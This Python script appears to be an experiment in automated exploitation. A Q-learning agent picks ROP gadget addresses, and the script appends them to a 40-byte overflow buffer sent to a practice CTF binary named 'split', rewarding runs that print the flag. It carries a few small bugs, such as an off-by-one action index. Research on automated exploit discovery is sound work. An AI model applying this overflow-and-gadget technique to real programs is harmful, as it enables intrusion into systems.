#! /usr/bin/env python3
# coding: utf-8


# RE imports
import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *
import time
# RL imports
import gym
from gym import error, spaces, utils
from gym.utils import seeding
import numpy as np
from itertools import permutations
import logging
import random
import datetime


# set logging
e = datetime.datetime.now()
filename = 'RLlogs/choices_'+e.strftime("%Y%m%d_%H%M%S")+'.txt'
f = open(filename, "w")
f.close()
foldername = "./GDBlogs"+e.strftime("%Y%m%d_%H%M%S")
if not os.path.exists(foldername):
    os.makedirs(foldername)


# define function to create the GDB breakpoints script
def createGDBscript(chosenActionsString, episodeNr):
    gdbscriptSetup = '''
break main
commands
set logging file '''+foldername+'''/logcommands'''+str(episodeNr)+'''.txt
set logging on
info registers
set logging off
c
end'''

    for action in chosenActionsString:
        gdbscriptSetup = gdbscriptSetup +'''
break *'''+action+'''
commands
set logging file '''+foldername+'''/logcommands'''+str(episodeNr)+'''.txt
set logging on
info registers
set logging off
c
end'''

    gdbscriptSetup = gdbscriptSetup + '''
continue
info registers
info source
continue'''
    
    return gdbscriptSetup

# get possible actions (hard coded for now, only works on my machine!!)
breakpoint_list = [0x4007c3, 0x601060, 0x40074b, 0x400538, 0x4005fc, 0x400740]
breakpoint_list_text = ["0x4007c3", "0x601060", "0x40074b", "0x400538", "0x4005fc", "0x400740"]


list_permutations = list()
for n in range(len(breakpoint_list) + 1):
    list_permutations += list(permutations(breakpoint_list, n))

list_permutations_text = list()
for n in range(len(breakpoint_list_text) + 1):
    list_permutations_text += list(permutations(breakpoint_list_text, n))

list_permutations = list(filter(None, list_permutations))
list_permutations_text = list(filter(None, list_permutations_text))

# define rewards
negativeReward = -1
positiveReward = 10

f = open(filename, "a")
f.write("positive reward: "+str(positiveReward)+"\n")
f.write("negative reward: "+str(negativeReward)+"\n")
f.close()


# Creating environments.
class BasicEnv(gym.Env):

    
    def __init__(self):
        # There are two actions, first will get reward of 1, second reward of -1. 
        self.action_space = 6
        self.observation_space = gym.spaces.Discrete(2)
       

    def step(self, chosenActions, episodeNr):


        ### run exploit

        #setup exploit
        exe = context.binary = ELF('./split')

        # create script for breakpoints
        gdbscriptSetup = createGDBscript(breakpoint_list_text,episodeNr)
        gdbscript = gdbscriptSetup.format(**locals())


        nrOfGadgetsTried = len(chosenActions)

        # run exploit attempt
        io = process([exe.path])
        gdbpid, iogdb = gdb.attach(io, gdbscript=gdbscript, api=True)
        #io = gdb.debug([exe.path], gdbscript=gdbscript)
        #io = gdb.debug([exe.path])

        # create payload - start with buffer
        payload = b"A"*40

        # create payload - add actions chosen by RLM
        for action in chosenActions:
            payload += p64(action)                      

        # send payload
        io.sendline(payload)

        # receive response
        response = io.recvall()

        # close
        iogdb.quit()
        io.kill()

        # return if success or not
        try:
            success = bool(re.search("(ROPE{.*?})", response.decode()))
        except:
            success = False

        if success:
            # subtract number of tries, since we don't want to reward unnecessary extra steps after retrieving the flag
            reward = positiveReward + nrOfGadgetsTried * negativeReward
            
        else:
            reward = nrOfGadgetsTried * negativeReward
                
        # regardless of the action, game is done after a single step
        done = True
        info = {}

        return state, reward, done, info, success


    def reset(self):
        state = 0
        return state


# # Q-Learning

# Source: https://deeplizard.com/learn/video/HGeI30uATws

env = BasicEnv()

action_space_size = len(list_permutations)
state_space_size = 1

q_table = np.zeros((state_space_size, action_space_size))

num_episodes = 500
max_steps_per_episode = 10 # but it won't go higher than 1

learning_rate = 0.1
discount_rate = 0.99

exploration_rate = 1
max_exploration_rate = 1
min_exploration_rate = 0.01

exploration_decay_rate = 0.001 #if we decrease it, will learn slower

rewards_all_episodes = []

f = open(filename, "a")
f.write("number of episodes: "+str(num_episodes)+"\n")
f.write("learning rate: "+str(learning_rate)+"\n")
f.write("discount rate: "+str(discount_rate)+"\n")
f.write("exploration rate: "+str(exploration_rate)+"\n")
f.write("max exploration rate: "+str(max_exploration_rate)+"\n")
f.write("min exploration rate: "+str(min_exploration_rate)+"\n")
f.write("exploration decay rate: "+str(exploration_decay_rate)+"\n")
f.write("--------------------------------------------------------\n")
f.close()


# Q-Learning algorithm
for episode in range(num_episodes):
    state = env.reset()
        
    done = False
    rewards_current_episode = 0
    
    for step in range(max_steps_per_episode):

        # Exploration -exploitation trade-off
        exploration_rate_threshold = random.uniform(0,1)
        if exploration_rate_threshold > exploration_rate: 
            actionNr = np.argmax(q_table[state,:])
            f = open(filename, "a")
            f.write("pick best option: "+str(actionNr)+"\n")
            f.close()
            print(episode)
        else:
            actionNr = random.randint(0, len(list_permutations)-1)
            f = open(filename, "a")
            f.write("pick random: "+str(actionNr)+"\n")
            f.close()
            print(episode)
        action = list_permutations[actionNr-1]
        
        new_state, reward, done, info, success = env.step(action, episode)
        
        f = open(filename, "a")
        f.write("choice: "+str(action)+"\n")
        f.write("reward: "+str(reward)+"\n")        
        f.write("success: "+str(success)+"\n")
        f.write("state: "+str(state)+"\n")
        f.close()

        # Update Q-table for Q(s,a)
        q_table[state, actionNr] = (1 - learning_rate) * q_table[state, actionNr] + learning_rate * (reward + discount_rate * np.max(q_table[new_state,:]))
            
        state = new_state
        rewards_current_episode += reward

        if done == True: 
            break
            
    # Exploration rate decay
    exploration_rate = min_exploration_rate + (max_exploration_rate - min_exploration_rate) * np.exp(-exploration_decay_rate * episode)
    
    rewards_all_episodes.append(rewards_current_episode)
    
# Calculate and print the average reward per 10 episodes
rewards_per_thousand_episodes = np.split(np.array(rewards_all_episodes), num_episodes / 10)


count = 10
print("********** Average  reward per 10 episodes **********\n")

f = open(filename, "a")
f.write("********** Average  reward per 10 episodes  **********\n")

for r in rewards_per_thousand_episodes:
    print(count, ": ", str(sum(r / 10)))
    f.write(str(count) + ": "+str(sum(r/10))+"\n")
    count += 10
f.close()


# Print updated Q-table
print("\n\n********** Q-table **********\n")
print(q_table)
        
f = open(filename, "a")
f.write("********** Q-table **********\n")
f.write(str(q_table))
f.close()






